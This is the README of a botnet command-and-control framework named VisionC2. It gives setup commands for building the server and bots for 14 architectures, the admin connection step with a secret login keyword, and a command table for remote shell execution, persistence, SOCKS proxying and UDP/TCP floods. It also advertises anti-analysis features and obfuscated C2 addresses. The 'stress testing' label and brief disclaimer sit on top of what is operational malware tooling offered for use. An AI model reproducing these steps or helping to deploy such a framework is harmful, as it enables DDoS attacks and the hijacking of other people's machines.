# VisionC2 – Advanced Botnet Command & Control Framework

![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3-red)
![Go Version](https://img.shields.io/badge/Go-1.23.0+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)

**VisionC2** is an advanced botnet framework built in Go focused on network stress testing. Features end-to-end TLS 1.3 encryption, anti-analysis techniques, and DDOS/RCE/SOCKS modules.

---

## 🚀 Installation & Setup

### Prerequisites

```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3
# Go 1.23+ required - see https://go.dev/dl/
```

### ⭐ Use the Setup Wizard (Recommended)

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
python3 setup.py
```

**That's it!** The wizard handles everything:

- C2 address configuration & obfuscation
- Random magic codes & protocol versions  
- TLS certificate generation
- Source code updates
- Building CNC + 14 bot architectures

> 💡 **Don't waste time with manual setup** - the wizard does it all in under 2 minutes!

---

## 🎯 Quick Usage

```bash
# Start server
cd cnc && ./cnc

# Connect admin (in another terminal)
nc YOUR_IP YOUR_ADMIN_PORT
# Type "spamtec" → login prompt appears

# Bot binaries ready in: bot/bins/
```

---

## 🛠️ Commands

| Command | Description |
|---------|-------------|
| `bots` | List active agents |
| `!shell <cmd>` | Remote execution |
| `!persist` | Establish persistence |
| `!socks <port>` | SOCKS5 proxy |
| `!udpflood <ip> <port> <dur>` | UDP flood |
| `!tcpflood <ip> <port> <dur>` | TCP flood |
| `help` | All commands |

---

## 🏗️ Architecture

```
Admin ◄──TLS 1.3──► C2 Server (443) ◄──► Bot Agents (14 archs)
```

---

## 🔐 Security

- TLS 1.3 encrypted communications
- HMAC challenge-response auth
- XOR+Base64 C2 obfuscation
- UPX compressed binaries
- Multi-tier user roles

---

## ⚖️ Disclaimer

**Authorized security research only.** Obtain written permission before use.

---

📧 **[dev@sinners.city](mailto:dev@sinners.city)** | Based on [1birdo](https://github.com/1Birdo)'s BotnetGo
